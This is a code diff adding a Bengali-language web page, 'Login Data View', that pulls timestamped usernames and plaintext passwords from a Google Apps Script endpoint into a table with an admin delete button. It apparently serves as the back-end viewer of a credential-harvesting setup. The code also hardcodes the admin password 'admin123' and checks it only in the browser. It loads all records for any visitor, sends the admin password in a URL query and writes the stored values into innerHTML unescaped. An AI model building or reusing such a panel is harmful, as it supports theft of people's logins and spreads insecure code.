@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<title>Login Data View</title>
+<style>
+body { font-family: Arial; padding:20px; background:#f8f9fa; }
+h2 { text-align:center; }
+table { width:100%; border-collapse:collapse; background:white; margin-top:20px; }
+th, td { border:1px solid #ddd; padding:10px; text-align:center; }
+th { background:#007bff; color:white; }
+tr:nth-child(even){ background:#f2f2f2; }
+button { padding:5px 10px; background:red; color:white; border:none; border-radius:3px; cursor:pointer; }
+button:hover { background:darkred; }
+#adminDiv { margin:10px 0; text-align:center; }
+</style>
+</head>
+<body>
+<h2>🧾 Login Data (Admin Protected)</h2>
+
+<div id="adminDiv">
+  <input type="password" id="adminPass" placeholder="Enter Admin Password">
+  <button onclick="loadData(true)">Login as Admin</button>
+</div>
+
+<table id="dataTable">
+<thead>
+<tr>
+<th>Timestamp</th>
+<th>Username</th>
+<th>Password</th>
+<th>Action</th>
+</tr>
+</thead>
+<tbody></tbody>
+</table>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  const scriptURL = "https://script.google.com/macros/s/AKfycbxBSLzkj9LXGoNAWXQWUQCSlTjfKQpAS35yRNtoMDSihTivOtSgdNCevZlIWInw-ZWY5w/exec";
+  const ADMIN_PASSWORD = "admin123";
+  let adminPassword = null;
+
+  async function loadData(isAdmin=false){
+    if(isAdmin){
+      adminPassword = document.getElementById("adminPass").value.trim();
+      if(adminPassword !== ADMIN_PASSWORD){
+        alert("❌ Invalid Admin Password!");
+        adminPassword = null;
+      }
+    }
+
+    try {
+      const res = await fetch(scriptURL);
+      if(!res.ok) throw new Error("Network response not ok");
+      const data = await res.json();
+      const tbody = document.querySelector("#dataTable tbody");
+      tbody.innerHTML = "";
+
+      data.forEach(row => {
+        const tr = document.createElement("tr");
+        let actionBtn = (adminPassword === ADMIN_PASSWORD) ? `<button onclick="deleteRow(${row.row})">Delete</button>` : "🔒";
+
+        tr.innerHTML = `
+          <td>${new Date(row.timestamp).toLocaleString()}</td>
+          <td>${row.username}</td>
+          <td>${row.password}</td>
+          <td>${actionBtn}</td>
+        `;
+        tbody.appendChild(tr);
+      });
+    } catch(err) {
+      alert("⚠️ ডেটা লোড করা যায়নি: "+err);
+    }
+  }
+
+  async function deleteRow(rowNumber){
+    if(!confirm("⚠️ এই Row permanent delete হবে। Proceed করতে চাও?")) return;
+    try {
+      const res = await fetch(scriptURL + "?row=" + rowNumber + "&adminPass=" + adminPassword, { method: "DELETE" });
+      if(!res.ok) throw new Error("Network response not ok");
+      const text = await res.text();
+      alert(text);
+      loadData(true); // refresh
+    } catch(err) {
+      alert("Error deleting row: "+err);
+    }
+  }
+
+  loadData(false); // normal user view
+  window.loadData = loadData;
+  window.deleteRow = deleteRow;
+});
+</script>
+</body>
+</html>
